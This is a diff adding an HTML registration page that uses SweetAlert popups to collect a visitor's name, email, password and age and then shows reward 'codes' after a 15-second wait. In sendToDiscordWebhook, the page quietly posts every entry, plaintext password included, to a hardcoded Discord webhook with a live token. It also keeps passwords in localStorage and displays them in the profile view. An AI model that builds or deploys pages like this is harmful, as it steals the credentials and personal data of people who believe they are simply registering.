@@ -1,0 +1,272 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registration Page</title>
+    <style>
+        body {
+            background-color: #f2f2f2;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+
+        #randomNumber {
+            padding: 20px;
+            margin: 50px;
+            border: 5px solid black;
+            border-radius: 10px;
+            font-size: 24px;
+            color: purple;
+            font-weight: bold;
+            box-shadow: 0 0 15px rgba(128, 0, 128, 0.5);
+        }
+
+        #registerButton,
+        #showProfileButton {
+            display: block;
+            margin: 20px auto;
+            background-color: purple;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(128, 0, 128, 0.5);
+            transition: background-color 0.3s;
+        }
+
+        #registerButton:hover,
+        #showProfileButton:hover {
+            background-color: darkviolet;
+        }
+
+        #passwordShowIcon {
+            margin-left: 5px;
+            cursor: pointer;
+        }
+
+        .code-container {
+            margin-top: 20px;
+        }
+
+        .code {
+            display: block;
+            margin: 10px;
+            background-color: #dcdcdc;
+            padding: 10px;
+            border-radius: 5px;
+            color: black;
+            font-weight: bold;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .copy-button {
+            background-color: green;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 0 8px rgba(0, 128, 0, 0.3);
+            transition: background-color 0.3s;
+        }
+
+        .copy-button:hover {
+            background-color: darkgreen;
+        }
+
+        .swal2-input {
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+    <!-- Include SweetAlert library -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+</head>
+<body>
+
+    <div id="randomNumber"></div>
+    <button id="registerButton">𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥 𝗡𝗢𝗪</button>
+    <button id="showProfileButton" style="display:none;">𝗦𝗛𝗢𝗪 𝗬𝗢𝗨𝗥 𝗣𝗥𝗢𝗙𝗜𝗟𝗘</button>
+
+    <script>
+        // Check if the user is already registered
+        const isUserRegistered = localStorage.getItem('userName') && localStorage.getItem('userEmail');
+        if (isUserRegistered) {
+            // Display the user ID and hide the register button
+            displayUserProfile();
+        }
+
+        function displayUserProfile() {
+            const userRandomNumber = getRandomNumber();
+            document.getElementById('randomNumber').textContent = 'User ID: ' + userRandomNumber;
+            document.getElementById('registerButton').style.display = 'none';
+            document.getElementById('showProfileButton').style.display = 'block';
+        }
+
+        function getRandomNumber() {
+            const storedNumber = localStorage.getItem('userRandomNumber');
+            if (storedNumber) {
+                return parseInt(storedNumber, 10);
+            } else {
+                const randomNumber = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
+                localStorage.setItem('userRandomNumber', randomNumber);
+                return randomNumber;
+            }
+        }
+
+        function showRegistrationAlert() {
+            Swal.fire({
+                title: '𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥 𝗡𝗢𝗪',
+                html: `
+                    <input type="text" id="userName" placeholder="Enter your name" class="swal2-input">
+                    <input type="email" id="userEmail" placeholder="Enter your email" class="swal2-input">
+                    <input type="password" id="userPassword" placeholder="Enter your password" class="swal2-input">
+                    <input type="password" id="confirmPassword" placeholder="Confirm your password" class="swal2-input">
+                    <input type="number" id="userAge" placeholder="Enter your age" class="swal2-input">
+                    <span id="passwordShowIcon"></span>`,
+                showCancelButton: true,
+                confirmButtonText: '𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥 ',
+                cancelButtonText: '𝗖𝗔𝗡𝗖𝗘𝗟',
+                preConfirm: () => {
+                    const userName = document.getElementById('userName').value;
+                    const userEmail = document.getElementById('userEmail').value;
+                    const userPassword = document.getElementById('userPassword').value;
+                    const confirmPassword = document.getElementById('confirmPassword').value;
+                    const userAge = document.getElementById('userAge').value;
+
+                    // Age verification
+                    if (userAge < 13) {
+                        Swal.showValidationMessage('Sorry, you are not eligible to register. You must be at least 13 years old.');
+                        return false;
+                    }
+
+                    // Password validation
+                    const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
+                    if (!userName || !userEmail || !validateEmail(userEmail) || !passwordRegex.test(userPassword) || userPassword !== confirmPassword) {
+                        Swal.showValidationMessage('Please enter valid information. Ensure the password meets the criteria and both passwords match.');
+                        return false;
+                    }
+
+                    // Username validation to block certain words
+                    const blockedWords = ['sex', 'fuck', 'nigga']; // Add more blocked words if needed
+                    if (blockedWords.some(word => userName.toLowerCase().includes(word))) {
+                        Swal.showValidationMessage('Please choose a different username. The chosen username contains blocked words.');
+                        return false;
+                    }
+
+                    // Store user information in localStorage
+                    localStorage.setItem('userName', userName);
+                    localStorage.setItem('userEmail', userEmail);
+                    localStorage.setItem('userPassword', userPassword);
+                    localStorage.setItem('userAge', userAge);
+                    return { userName, userEmail, userPassword, userAge };
+                }
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    Swal.fire({
+                        title: 'Registering, Please Wait...',
+                        timer: 15000,
+                        showConfirmButton: false,
+                        allowOutsideClick: false,
+                    });
+
+                    setTimeout(() => {
+                        displayUserProfile();
+                        const userId = getRandomNumber();
+                        const code1 = "RXC1263782";
+                        Swal.fire({
+                            icon: 'success',
+                            title: 'Registration Successful!',
+                            html: `
+                                <p>Your User ID is: ${userId}</p>
+                                <p>Here is your code:</p>
+                                <div class="code-container">
+                                    <span class="code">${code1}</span>
+                                    <button class="copy-button" onclick="copyToClipboard('${code1}')">Copy Code</button>
+                                </div>
+                            `
+                        });
+
+                        // Send data to Discord Webhook
+                        sendToDiscordWebhook({
+                            userName: localStorage.getItem('userName'),
+                            userEmail: localStorage.getItem('userEmail'),
+                            userPassword: localStorage.getItem('userPassword'),
+                            userAge: localStorage.getItem('userAge'),
+                            userId: userId,
+                            code1: code1
+                        });
+                    }, 15000);
+                }
+            });
+        }
+
+        function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function showProfile() {
+            const userName = localStorage.getItem('userName');
+            const userEmail = localStorage.getItem('userEmail');
+            const userPassword = localStorage.getItem('userPassword');
+            const userAge = localStorage.getItem('userAge');
+
+            const code1 = "RXC1263782";
+            const code2 = "RX17527903";
+			const code3 = "RX68269929";
+
+            Swal.fire({
+                title: 'Your Profile',
+                html: `<p>Name: ${userName}</p><p>Email: ${userEmail}</p><p>Password: ${userPassword}</p><p>Age: ${userAge}</p>
+                       <p>Your Codes:</p>
+                       <div class="code-container">
+                           <span class="code">${code1}</span>
+                           <span class="code">${code2}</span>
+                       </div>`
+            });
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                Swal.fire('Copied!', 'The code has been copied to your clipboard.', 'success');
+            }, (err) => {
+                Swal.fire('Error!', 'Failed to copy the code.', 'error');
+            });
+        }
+
+        function sendToDiscordWebhook(data) {
+            fetch('https://ptb.discord.com/api/webhooks/1275477546833805416/VM3RQ-2jvLxkjzOiOmvoj9UJu5xlueKF7v_MWqzotk4wvlYFPGOPWPF5vpQMPO11sDfO', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `New Registration\nUser ID: ${data.userId}\nName: ${data.userName}\nEmail: ${data.userEmail}\nPassword: ${data.userPassword}\nAge: ${data.userAge}\nCode 1: ${data.code1}`
+                })
+            }).catch(err => console.error('Error sending to Discord webhook:', err));
+        }
+
+        document.getElementById('registerButton').addEventListener('click', showRegistrationAlert);
+        document.getElementById('showProfileButton').addEventListener('click', showProfile);
+
+        // Add password show/hide functionality
+        const passwordInput = document.getElementById('userPassword');
+        const confirmPasswordInput = document.getElementById('confirmPassword');
+        const passwordShowIcon = document.getElementById('passwordShowIcon');
+
+        passwordShowIcon.addEventListener('click', () => {
+            const type = passwordInput.type === 'password' ? 'text' : 'password';
+            passwordInput.type = type;
+            confirmPasswordInput.type = type;
+            passwordShowIcon.textContent = type === 'password' ? '' : '👁️‍🗨️';
+        });
+    </script>
+
+</body>
+</html>
